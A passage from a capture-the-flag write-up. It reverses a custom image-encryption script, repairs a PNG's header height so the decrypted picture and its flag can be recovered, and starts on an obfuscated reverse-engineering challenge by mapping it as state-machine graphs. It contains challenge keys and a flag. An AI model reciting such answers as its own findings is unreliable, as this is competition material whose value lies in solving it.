= tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, \u0026#39;little\u0026#39;)))))) prev = iv mok_bytes = b\u0026#34;\u0026#34; for i in fmok_pixels: appending = bytes(map(lambda x, y: x ^ y, i, prev)) # assert tuple(map(lambda x, y: x ^ y, appending, prev)) == tuple(i) mok_bytes += appending prev = tuple(i)# Source mok = Image.open(\u0026#34;el_mok.png\u0026#34;) mok_bytes = mok.tobytes() # Reverse mok = Image.frombytes(\u0026#39;RGBA\u0026#39;, (887,499), mok_bytes, \u0026#39;raw\u0026#39;) mok.save(\u0026#34;el_mok.png\u0026#34;) We actually cannot figure out the dimensions of el_mok.png from the source code. But considering the source code looks like encryption, and both $887$ and $499$ are primes, we can first assume that el_mok.png is also $887\\times499$ unless we find the resulting image misaligned.\nWe can test the reversed source code for the fixed(?) brain_memory.png, leaving all the unseen part as black or any color. (Due to the action of per-block xor-mod and the property of CBC block cipher decryption mode, the unknown bytes should not propagate beyond the neighbouring blocks.)\n\nWe can already notice a man in the middle of this image, but since most parts are unknown, maybe the sources have already provided enough details but something is hidden?\nPart III. Finding out the Culprit Summary. This png file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\\frac{1.7 \\text{MB}}{76 \\text{KB}} \\approx \\frac{499}{22}$, maybe we can confirm something \u0026hellip;?  Yes, all the pixels ($887\\times499$) are actually included in brain_memory.png, the only problem is that the dimension is not probably set (modified in some ways).\nBy checking the W3 specification2 of PNG file, we can know that the height is the 5th to the 8th bytes after the start of IHDR chunk. (The 1st to the 4th bytes are the width)\n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0377[0000 0016]0806 0000 0063 7365 ...w.........cse So we directly modify 00000016 (22) to 000001f3 (499) to see if it works.\nMSPaint: Success SAI2: Internal Error GIMP: Error paint.net: Success So we can just use paint.net to fix the remaining parts by exporting the image rendered by it.\nPart IV. Completing the Source Code Here we try our reversed program to the \u0026quot;fixed image\u0026quot;:\nfrom PIL import Image from Crypto.Util.number import bytes_to_long, long_to_bytes from Crypto.Util.Padding import pad, unpad from gmpy2 import isqrt from Crypto.Cipher import AES # for the first attempt to recover using the 887 x 22 image # fffmok = Image.open(\u0026#34;brain_memory.png\u0026#34;) # # fffmok_pixels_rev = [] # for y in range(887): # for x in range(499): # fffmok_pixels_rev.append(fffmok.getpixel((y, x)) if x \u0026lt; 22 else #(0,0,0,0)) fffmok = Image.open(\u0026#34;brain_memory.png\u0026#34;) fffmok_pixels_rev = [] for y in range(887): for x in range(499): fffmok_pixels_rev.append(fffmok.getpixel((y, x))) key = bytes_to_long(b\u0026#34;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_\u0026#34;) key_mask_length = (18446744073709551615).bit_length() key_low64 = key \u0026amp; (2 ** key_mask_length - 1) key_mask64 = key ^ key_low64 ffmok_bytes_rev = b\u0026#34;\u0026#34; for i in range(0, len(fffmok_pixels_rev) - 1, 2): r1, g1, b1, o1 = fffmok_pixels_rev[i] r2, g2, b2, o2 = fffmok_pixels_rev[i + 1] v = bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2])) p = ((key_mask64 - (key_mask64 - v) % 18446744073709551615) + 18446744073709551615) ^ key # assert (p ^ key) % 18446744073709551615 == v ffmok_bytes_rev += p.to_bytes(8, \u0026#34;big\u0026#34;) ffmok_bytes_rev += bytes(fffmok_pixels_rev[-1]) k = b\u0026#39;\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01\u0026#39; iv = b\u0026#39;\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF\u0026#39; aes = AES.new(k, AES.MODE_CBC, iv) fmok_bytes_rev = aes.decrypt(ffmok_bytes_rev[:-4]) + ffmok_bytes_rev[-4:] fmok_pixels_rev = [[fmok_bytes_rev[i+j] for j in range(8) if i + j \u0026lt; len(fmok_bytes_rev)] for i in range(0, len(fmok_bytes_rev), 8)] # iv = tuple(b\u0026#34;ASDFQWER\u0026#34;) iv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, \u0026#39;little\u0026#39;)))))) prev = iv mok_bytes_rev = b\u0026#34;\u0026#34; for i in fmok_pixels_rev: prev0 = [_ for _ in prev] appending = bytes(map(lambda x, y: x ^ y, i, prev)) # assert tuple(map(lambda x, y: x ^ y, appending, prev0)) == tuple(i) mok_bytes_rev += appending prev = tuple(i) mok = Image.frombytes(\u0026#39;RGBA\u0026#39;, (887,499), mok_bytes_rev, \u0026#39;raw\u0026#39;) mok.save(\u0026#34;el_mok.png\u0026#34;) # open(\u0026#34;el_mok.data\u0026#34;, \u0026#34;wb\u0026#34;).write(mok_bytes_rev) if unsure about the dimension Part V. The Memories Recovered \nTherefore, the flag is 3k{I_Am_50_pR3t7y_W1tH_My_H4IR}.\nLayers (Reverse; 488 points) Solved by Mystiz and cdemirer.\nNote. This is written based on their first revision of the code. They have released a new revision which has a different offset.  We are given a 64-bit ELF called layers in the challenge. The functions are obfuscated so that the logic is not trivial to read. For instance, sub_400E40 is one of relatively simpler function:\n__int64 __fastcall sub_400E40(const char *a1) { size_t v1; // rax  signed int v2; // ecx  signed int v4; // [rsp+2Ch] [rbp-14h]  int v5; // [rsp+30h] [rbp-10h]  unsigned int v6; // [rsp+34h] [rbp-Ch]  v6 = 0; v5 = 0; v4 = 0x1EB0722D; while ( v4 != 0x87679F00 ) { switch ( v4 ) { case (int)0x9415E80F: ++v5; v4 = 0x1EB0722D; break; case 0x12F4C285: v6 += a1[v5]; v4 = 0x9415E80F; break; case 0x1EB0722D: v1 = strlen(a1); v2 = 0x87679F00; if ( v5 \u0026lt; v1 ) v2 = 0x12F4C285; v4 = v2; break; } } return v6; } Part I. Drawing State Machines For sub_400E40 we mentioned above, we can see that the code to be executed is determined by v4. For instance, when v4 = 0x1EB0722D, then v1 = strlen(a1) and will jump to 0x12F4C285 if v5 \u0026lt; v1, or otherwise 0x87679F00. I think this is pretty similar to a state machine (where v4 is the state), hence I started to draw the figures. Let's see sub_400E40 visually:\ndigraph { node [shape=\u0026#34;box\u0026#34;]; \u0026#34;BEGIN\u0026#34; -\u0026gt; \u0026#34;0x1EB0722D\u0026#34; \u0026#34;0x87679F00\u0026#34;[label=\u0026#34;END\u0026#34;] \u0026#34;0x9415E80F\u0026#34;[label=\u0026#34;++v5\u0026#34;] \u0026#34;0x9415E80F\u0026#34;-\u0026gt;\u0026#34;0x1EB0722D\u0026#34; \u0026#34;0x12F4C285\u0026#34;[label=\u0026#34;v6 += a1[v5]\u0026#34;] \u0026#34;0x12F4C285\u0026#34;-\u0026gt;\u0026#34;0x9415E80F\u0026#34; \u0026#34;0x1EB0722D\u0026#34;[label=\u0026#34;v1 = strlen(a1)\u0026#34;] \u0026#34;0x1EB0722D\u0026#34;-\u0026gt;\u0026#34;0x12F4C285\u0026#34;[label=\u0026#34;v5 \u0026lt; v1\u0026#34;] \u0026#34;0x1EB0722D\u0026#34;-\u0026gt;\u0026#34;0x87679F00\u0026#34;[style=\u0026#34;dashed\u0026#34;] } Since v6 is the returning variable, we can see that the function is computing the sum of ASCII values, i.e., a1[0] + a1[1] + ...\nIn the similar fashion, I manually built the graphs for main and some of the functions called by main. Here are some of them:\nmain digraph { node [shape=\u0026#34;box\u0026#34;]; \u0026#34;BEGIN\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;BEGIN\u0026#34; -\u0026gt; \u0026#34;0x7F83FB5\u0026#34; \u0026#34;0x8130ED43\u0026#34;[label=\u0026#34;memset c2, k2, m2\\nj1 = 0\u0026#34;] \u0026#34;0x8130ED43\u0026#34;-\u0026gt;\u0026#34;0x93689926\u0026#34; \u0026#34;0x84A7F436\u0026#34;[label=\u0026#34;j2 = 0\u0026#34;] \u0026#34;0x84A7F436\u0026#34;-\u0026gt;\u0026#34;0x325B57D6\u0026#34; \u0026#34;0x8F6AECCF\u0026#34;[label=\u0026#34;k2[j1] = rand()\u0026#34;] \u0026#34;0x8F6AECCF\u0026#34;-\u0026gt;\u0026#34;0xCEDBC306\u0026#34; \u0026#34;0x93689926\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x93689926\u0026#34;-\u0026gt;\u0026#34;0x8F6AECCF\u0026#34;[label=\u0026#34;j1 \u0026lt; 16\u0026#34;] \u0026#34;0x93689926\u0026#34;-\u0026gt;\u0026#34;0x84A7F436\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x9E00E14A\u0026#34;[label=\u0026#34;++j4\u0026#34;] \u0026#34;0x9E00E14A\u0026#34;-\u0026gt;\u0026#34;0x379D135E\u0026#34; \u0026#34;0xA026F981\u0026#34;[label=\u0026#34;++j5\u0026#34;] \u0026#34;0xA026F981\u0026#34;-\u0026gt;\u0026#34;0xB9048286\u0026#34; \u0026#34;0xAD9286F4\u0026#34;[label=\u0026#34;memset(tmp, 0, 32)\\nsub_403EC0(flag[16*j3], key, tmp, 32)\\nj4 = 0\u0026#34;] \u0026#34;0xAD9286F4\u0026#34;-\u0026gt;\u0026#34;0x379D135E\u0026#34; \u0026#34;0xAE672971\u0026#34;[label=\u0026#34;*flag_tail=0\u0026#34;] \u0026#34;0xAE672971\u0026#34;-\u0026gt;\u0026#34;0xF8F2B980\u0026#34; \u0026#34;0xB9048286\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xB9048286\u0026#34;-\u0026gt;\u0026#34;0x13F8F8B8\u0026#34;[label=\u0026#34;j5 \u0026lt; 32\u0026#34;] \u0026#34;0xB9048286\u0026#34;-\u0026gt;\u0026#34;0xF436E04E\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xBD66D1C0\u0026#34;[label=\u0026#34;v33[16 * j3 + j4] = tmp[j4]\u0026#34;] \u0026#34;0xBD66D1C0\u0026#34;-\u0026gt;\u0026#34;0x9E00E14A\u0026#34; \u0026#34;0xCBD7742F\u0026#34;[label=\u0026#34;++j2\u0026#34;] \u0026#34;0xCBD7742F\u0026#34;-\u0026gt;\u0026#34;0x325B57D6\u0026#34; \u0026#34;0xCEDBC306\u0026#34;[label=\u0026#34;++j1\u0026#34;] \u0026#34;0xCEDBC306\u0026#34;-\u0026gt;\u0026#34;0x93689926\u0026#34; \u0026#34;0xDA5A3C78\u0026#34;[label=\u0026#34;++j6\u0026#34;] \u0026#34;0xDA5A3C78\u0026#34;-\u0026gt;\u0026#34;0x28B41C13\u0026#34; \u0026#34;0xE3A80132\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xE3A80132\u0026#34;-\u0026gt;\u0026#34;0x263F9E70\u0026#34; \u0026#34;0xEB90905D\u0026#34;[label=\u0026#34;++i\u0026#34;] \u0026#34;0xEB90905D\u0026#34;-\u0026gt;\u0026#34;0x6C6E9FB7\u0026#34; \u0026#34;0xEE3FA927\u0026#34;[label=\u0026#34;sprintf(flag, \\\u0026#34;%s%c\\\u0026#34;, flag, pad)\u0026#34;] \u0026#34;0xEE3FA927\u0026#34;-\u0026gt;\u0026#34;0xDA5A3C78\u0026#34; \u0026#34;0xF2CAB7B8\u0026#34;[label=\u0026#34;seed = sub_400E40(flag)\\nsrand(seed)\\nj5 = 0\u0026#34;] \u0026#34;0xF2CAB7B8\u0026#34;-\u0026gt;\u0026#34;0xB9048286\u0026#34; \u0026#34;0xF436E04E\u0026#34;[label=\u0026#34;ptr = malloc(0x20uLL)\\npad = 16 - (strlen(flag) \u0026amp; 0xF)\\nj6 = 0\u0026#34;] \u0026#34;0xF436E04E\u0026#34;-\u0026gt;\u0026#34;0x28B41C13\u0026#34; \u0026#34;0xF8F2B980\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xF8F2B980\u0026#34;-\u0026gt;\u0026#34;0x4119DFE7\u0026#34;[label=\u0026#34;strlen(flag) \u0026gt; 0x28\u0026#34;] \u0026#34;0xF8F2B980\u0026#34;-\u0026gt;\u0026#34;0xF2CAB7B8\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x7F83FB5\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x7F83FB5\u0026#34;-\u0026gt;\u0026#34;0xAE672971\u0026#34;[label=\u0026#34;v39\u0026#34;] \u0026#34;0x7F83FB5\u0026#34;-\u0026gt;\u0026#34;0xF8F2B980\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x1238A7CD\u0026#34;[label=\u0026#34;j3_ = j3;\\nflen = strlen(flag)\u0026#34;] \u0026#34;0x1238A7CD\u0026#34;-\u0026gt;\u0026#34;0xAD9286F4\u0026#34;[label=\u0026#34;j3_ \u0026lt; flen\u0026gt;\u0026gt;4\u0026#34;] \u0026#34;0x1238A7CD\u0026#34;-\u0026gt;\u0026#34;0x8130ED43\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x13F8F8B8\u0026#34;[label=\u0026#34;key[j5] = rand()\u0026#34;] \u0026#34;0x13F8F8B8\u0026#34;-\u0026gt;\u0026#34;0xA026F981\u0026#34; \u0026#34;0x140AF898\u0026#34;[label=\u0026#34;memset(m2, 0, 8uLL);\\n__isoc99_sscanf(\u0026amp;v33[8 * j2], \\\u0026#34;%8s\\\u0026#34;, m2)\\nsub_4008F0(m2, k2)\\nsprintf(c2, \\\u0026#34;%s%s\\\u0026#34;, c2, m2)\u0026#34;] \u0026#34;0x140AF898\u0026#34;-\u0026gt;\u0026#34;0xCBD7742F\u0026#34; \u0026#34;0x15223C70\u0026#34;[label=\u0026#34;END\u0026#34;] \u0026#34;0x263F9E70\u0026#34;[label=\u0026#34;++j3\u0026#34;] \u0026#34;0x263F9E70\u0026#34;-\u0026gt;\u0026#34;0x1238A7CD\u0026#34; \u0026#34;0x28B41C13\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x28B41C13\u0026#34;-\u0026gt;\u0026#34;0xEE3FA927\u0026#34;[label=\u0026#34;j6 \u0026lt; pad\u0026#34;] \u0026#34;0x28B41C13\u0026#34;-\u0026gt;\u0026#34;0x68B9F247\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x325B57D6\u0026#34;[label=\u0026#34;v13 = strlen(v33)\u0026#34;] \u0026#34;0x325B57D6\u0026#34;-\u0026gt;\u0026#34;0x140AF898\u0026#34;[label=\u0026#34;j2 \u0026lt; v13 \u0026gt;\u0026gt; 3\u0026#34;] \u0026#34;0x325B57D6\u0026#34;-\u0026gt;\u0026#34;0x41DBA672\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x36B7A523\u0026#34;[label=\u0026#34;fn_key ^= TARGET_C[i] ^ c2[i]\u0026#34;] \u0026#34;0x36B7A523\u0026#34;-\u0026gt;\u0026#34;0xEB90905D\u0026#34; \u0026#34;0x379D135E\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x379D135E\u0026#34;-\u0026gt;\u0026#34;0xBD66D1C0\u0026#34;[label=\u0026#34;j4 \u0026lt; 16\u0026#34;] \u0026#34;0x379D135E\u0026#34;-\u0026gt;\u0026#34;0xE3A80132\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x4119DFE7\u0026#34;[label=\u0026#34;FAIL\u0026#34;] \u0026#34;0x41DBA672\u0026#34;[label=\u0026#34;i = 0\u0026#34;] \u0026#34;0x41DBA672\u0026#34; -\u0026gt; \u0026#34;0x6C6E9FB7\u0026#34; \u0026#34;0x68B9F247\u0026#34;[label=\u0026#34;j3 = 0\u0026#34;] \u0026#34;0x68B9F247\u0026#34; -\u0026gt; \u0026#34;0x1238A7CD\u0026#34; \u0026#34;0x6C6E9FB7\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x6C6E9FB7\u0026#34; -\u0026gt; \u0026#34;0x36B7A523\u0026#34;[label=\u0026#34;i \u0026lt; 48\u0026#34;] \u0026#34;0x6C6E9FB7\u0026#34; -\u0026gt; \u0026#34;0x15223C70\u0026#34;[style=\u0026#34;dashed\u0026#34;] } sub_403EC0 digraph { node [shape=\u0026#34;box\u0026#34;]; \u0026#34;BEGIN\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;sub_403090\u0026#34;[fillcolor=\u0026#34;yellow\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;BEGIN\u0026#34; -\u0026gt; \u0026#34;sub_403090\u0026#34; \u0026#34;sub_403090\u0026#34; -\u0026gt; \u0026#34;0xC69A2A67\u0026#34; \u0026#34;0xA57D3848\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;0xA57D3848\u0026#34; -\u0026gt; \u0026#34;0xA5AA2438\u0026#34; \u0026#34;0xA5AA2438\u0026#34;[label=\u0026#34;++i\u0026#34;] \u0026#34;0xA5AA2438\u0026#34; -\u0026gt; \u0026#34;0x39ABA8E6\u0026#34; \u0026#34;0xBD3CC7E5\u0026#34;[label=\u0026#34;j = 0\u0026#34;] \u0026#34;0xBD3CC7E5\u0026#34; -\u0026gt; \u0026#34;0xF100B3F1\u0026#34; \u0026#34;0xC69A2A67\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xC69A2A67\u0026#34; -\u0026gt; \u0026#34;0xBD3CC7E5\u0026#34;[label=\u0026#34;k \u0026lt; 32\u0026#34;] \u0026#34;0xC69A2A67\u0026#34; -\u0026gt; \u0026#34;0x6968BCED\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xCF365A10\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xCF365A10\u0026#34; -\u0026gt; \u0026#34;0x120F462B\u0026#34; \u0026#34;0xF100B3F1\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xF100B3F1\u0026#34; -\u0026gt; \u0026#34;0x510340B5\u0026#34;[label=\u0026#34;j \u0026lt; 4\u0026#34;] \u0026#34;0xF100B3F1\u0026#34; -\u0026gt; \u0026#34;0x5E778DDD\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xFCEC94E4\u0026#34;[label=\u0026#34;message[0] ^= s[128] ^ 0x734CA101\\nmessage[1] ^= s[129]\\nmessage[2] ^= s[130]\\nmessage[3] ^= s[131] ^ 0xA9BDC3C0\u0026#34;] \u0026#34;0xFCEC94E4\u0026#34; -\u0026gt; \u0026#34;0xCF365A10\u0026#34; \u0026#34;0x120F462B\u0026#34;[label=\u0026#34;++k\u0026#34;] \u0026#34;0x120F462B\u0026#34; -\u0026gt; \u0026#34;0xC69A2A67\u0026#34; \u0026#34;0x2E78E25C\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x2E78E25C\u0026#34; -\u0026gt; \u0026#34;0x45DFAE8F\u0026#34;[label=\u0026#34;k \u0026lt; 31\u0026#34;] \u0026#34;0x2E78E25C\u0026#34; -\u0026gt; \u0026#34;0xFCEC94E4\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x39ABA8E6\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x39ABA8E6\u0026#34; -\u0026gt; \u0026#34;0xA57D3848\u0026#34;[label=\u0026#34;i \u0026lt; 32\u0026#34;] \u0026#34;0x39ABA8E6\u0026#34; -\u0026gt; \u0026#34;0x2E78E25C\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x45DFAE8F\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;0x45DFAE8F\u0026#34; -\u0026gt; \u0026#34;0xCF365A10\u0026#34; \u0026#34;0x510340B5\u0026#34;[label=\u0026#34;v33[j] = s[4*k+j] ^ message_2[j];\\nmessage_2[j] = 0\u0026#34;] \u0026#34;0x510340B5\u0026#34; -\u0026gt; \u0026#34;0x7E76B88E\u0026#34; \u0026#34;0x5E778DDD\u0026#34;[label=\u0026#34;i = 0\u0026#34;] \u0026#34;0x5E778DDD\u0026#34; -\u0026gt; \u0026#34;0x39ABA8E6\u0026#34; \u0026#34;0x6968BCED\u0026#34;[label=\u0026#34;END\u0026#34;] \u0026#34;0x7E76B88E\u0026#34;[label=\u0026#34;++j\u0026#34;] \u0026#34;0x7E76B88E\u0026#34; -\u0026gt; \u0026#34;0xF100B3F1\u0026#34; } sub_403090 digraph { node [shape=\u0026#34;box\u0026#34;]; \u0026#34;BEGIN\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;BEGIN\u0026#34; -\u0026gt; \u0026#34;0xA9B955DB\u0026#34; \u0026#34;0x9606678C\u0026#34;[label=\u0026#34;++v31\u0026#34;] \u0026#34;0x9606678C\u0026#34; -\u0026gt; \u0026#34;0xE95AC0CE\u0026#34; \u0026#34;0x9AEEB6EF\u0026#34;[label=\u0026#34;++v33\u0026#34;] \u0026#34;0x9AEEB6EF\u0026#34; -\u0026gt; \u0026#34;0x5D8F0B74\u0026#34; \u0026#34;0x9D018AD3\u0026#34;[label=\u0026#34;s[v34] = v37[4*v34]\u0026#34;] \u0026#34;0x9D018AD3\u0026#34; -\u0026gt; \u0026#34;0x2ECFFA35\u0026#34; \u0026#34;0x9ED567C1\u0026#34;[label=\u0026#34;v30 = 0\u0026#34;] \u0026#34;0x9ED567C1\u0026#34; -\u0026gt; \u0026#34;0x266844EC\u0026#34; \u0026#34;0xA9B955DB\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xA9B955DB\u0026#34; -\u0026gt; \u0026#34;0x2F508473\u0026#34;[label=\u0026#34;!v44\u0026#34;] \u0026#34;0xA9B955DB\u0026#34; -\u0026gt; \u0026#34;0xC5DE43B8\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xAB353F6F\u0026#34;[label=\u0026#34;v37[v35] = v42[v35]\u0026#34;] \u0026#34;0xAB353F6F\u0026#34; -\u0026gt; \u0026#34;0x68961212\u0026#34; \u0026#34;0xAC6E0E08\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xAC6E0E08\u0026#34; -\u0026gt; \u0026#34;0x1CD6C9C1\u0026#34; \u0026#34;0xB52C03B2\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xB52C03B2\u0026#34; -\u0026gt; \u0026#34;0x1E2DB7B4\u0026#34; \u0026#34;0xC04417E3\u0026#34;[label=\u0026#34;++v32\u0026#34;] \u0026#34;0xC04417E3\u0026#34; -\u0026gt; \u0026#34;0xFBD35FED\u0026#34; \u0026#34;0xC20FEFFC\u0026#34;[label=\u0026#34;v37[v36] = 1\\nv34 = 0\u0026#34;] \u0026#34;0xC20FEFFC\u0026#34; -\u0026gt; \u0026#34;0x122E3189\u0026#34; \u0026#34;0xC3734AAC\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xC3734AAC\u0026#34; -\u0026gt; \u0026#34;0xB52C03B2\u0026#34; \u0026#34;0xC5DE43B8\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xC5DE43B8\u0026#34; -\u0026gt; \u0026#34;0xD35B09A7\u0026#34;[label=\u0026#34;v40 \u0026lt; 0x20\u0026#34;] \u0026#34;0xC5DE43B8\u0026#34; -\u0026gt; \u0026#34;0x2E8B62E9\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xC8900AC5\u0026#34;[label=\u0026#34;v29 = (3 - v30) % 32\\nv28 = 0\\nv27 = 0\u0026#34;] \u0026#34;0xC8900AC5\u0026#34; -\u0026gt; \u0026#34;0x355CE5DB\u0026#34; \u0026#34;0xD35B09A7\u0026#34;[label=\u0026#34;memset(v37, 0, 0x20)\\nv36 = v40\\nv35 = 0\u0026#34;] \u0026#34;0xD35B09A7\u0026#34; -\u0026gt; \u0026#34;0x7AFA98D4\u0026#34; \u0026#34;0xD5C4F2A6\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;0xD5C4F2A6\u0026#34; -\u0026gt; \u0026#34;0x9606678C\u0026#34; \u0026#34;0xDCDB893A\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xDCDB893A\u0026#34; -\u0026gt; \u0026#34;0x1E2DB7B4\u0026#34; \u0026#34;0xE07F4AFD\u0026#34;[label=\u0026#34;v33 = 0\u0026#34;] \u0026#34;0xE07F4AFD\u0026#34; -\u0026gt; \u0026#34;0x5D8F0B74\u0026#34; \u0026#34;0xE1928E6D\u0026#34;[label=\u0026#34;v24 = ((v28 \u0026gt;\u0026gt; v26) \u0026amp; 1) \u0026lt;\u0026lt; v27\\nv43[4 * v30 + v26] = v43[4 * v30 + v26] | v24;\u0026#34;] \u0026#34;0xE1928E6D\u0026#34; -\u0026gt; \u0026#34;0xEDCFB4AF\u0026#34; \u0026#34;0xE95AC0CE\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xE95AC0CE\u0026#34; -\u0026gt; \u0026#34;0xD5C4F2A6\u0026#34;[label=\u0026#34;v31 \u0026lt; 140\u0026#34;] \u0026#34;0xE95AC0CE\u0026#34; -\u0026gt; \u0026#34;0x9ED567C1\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xEDCFB4AF\u0026#34;[label=\u0026#34;++v26\u0026#34;] \u0026#34;0xEDCFB4AF\u0026#34; -\u0026gt; \u0026#34;0x67B26225\u0026#34; \u0026#34;0xFBD35FED\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0xFBD35FED\u0026#34; -\u0026gt; \u0026#34;0x4F5A98FA\u0026#34;[label=\u0026#34;v32 \u0026lt; 8\u0026#34;] \u0026#34;0xFBD35FED\u0026#34; -\u0026gt; \u0026#34;0x521305BC\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x122E3189\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x122E3189\u0026#34; -\u0026gt; \u0026#34;0x9D018AD3\u0026#34;[label=\u0026#34;v34 \u0026lt; 8\u0026#34;] \u0026#34;0x122E3189\u0026#34; -\u0026gt; \u0026#34;0xDCDB893A\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x1CD6C9C1\u0026#34;[label=\u0026#34;++v27\u0026#34;] \u0026#34;0x1CD6C9C1\u0026#34; -\u0026gt; \u0026#34;0x355CE5DB\u0026#34; \u0026#34;0x1E2DB7B4\u0026#34;[label=\u0026#34;v32 = 0\u0026#34;] \u0026#34;0x1E2DB7B4\u0026#34; -\u0026gt; \u0026#34;0xFBD35FED\u0026#34; \u0026#34;0x266844EC\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x266844EC\u0026#34; -\u0026gt; \u0026#34;0xC8900AC5\u0026#34;[label=\u0026#34;v30 \u0026lt; 33\u0026#34;] \u0026#34;0x266844EC\u0026#34; -\u0026gt; \u0026#34;0x775D4F05\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x2DC162EB\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x2DC162EB\u0026#34; -\u0026gt; \u0026#34;0x7E2E7A9E\u0026#34; \u0026#34;0x2E8B62E9\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x2E8B62E9\u0026#34; -\u0026gt; \u0026#34;0xE07F4AFD\u0026#34;[label=\u0026#34;v40 == 32\u0026#34;] \u0026#34;0x2E8B62E9\u0026#34; -\u0026gt; \u0026#34;0x39486DAD\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x2ECFFA35\u0026#34;[label=\u0026#34;++v34\u0026#34;] \u0026#34;0x2ECFFA35\u0026#34; -\u0026gt; \u0026#34;0x122E3189\u0026#34; \u0026#34;0x2F508473\u0026#34;[label=\u0026#34;EXIT(1)\u0026#34;] \u0026#34;0x355CE5DB\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x355CE5DB\u0026#34; -\u0026gt; \u0026#34;0x718C2A8A\u0026#34;[label=\u0026#34;v27 \u0026lt; 32\u0026#34;] \u0026#34;0x355CE5DB\u0026#34; -\u0026gt; \u0026#34;0x2DC162EB\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x39486DAD\u0026#34;[label=\u0026#34;EXIT(1)\u0026#34;] \u0026#34;0x4F5A98FA\u0026#34;[label=\u0026#34;v38[v32] = s[v32]\u0026#34;] \u0026#34;0x4F5A98FA\u0026#34; -\u0026gt; \u0026#34;0xC04417E3\u0026#34; \u0026#34;0x521305BC\u0026#34;[label=\u0026#34;v31 = 8\u0026#34;] \u0026#34;0x521305BC\u0026#34; -\u0026gt; \u0026#34;0xE95AC0CE\u0026#34; \u0026#34;0x5D8F0B74\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x5D8F0B74\u0026#34; -\u0026gt; \u0026#34;0x7EE39471\u0026#34;[label=\u0026#34;v33 \u0026lt; 8\u0026#34;] \u0026#34;0x5D8F0B74\u0026#34; -\u0026gt; \u0026#34;0xC3734AAC\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x67B26225\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x67B26225\u0026#34; -\u0026gt; \u0026#34;0xE1928E6D\u0026#34;[label=\u0026#34;v26 \u0026lt; 4\u0026#34;] \u0026#34;0x67B26225\u0026#34; -\u0026gt; 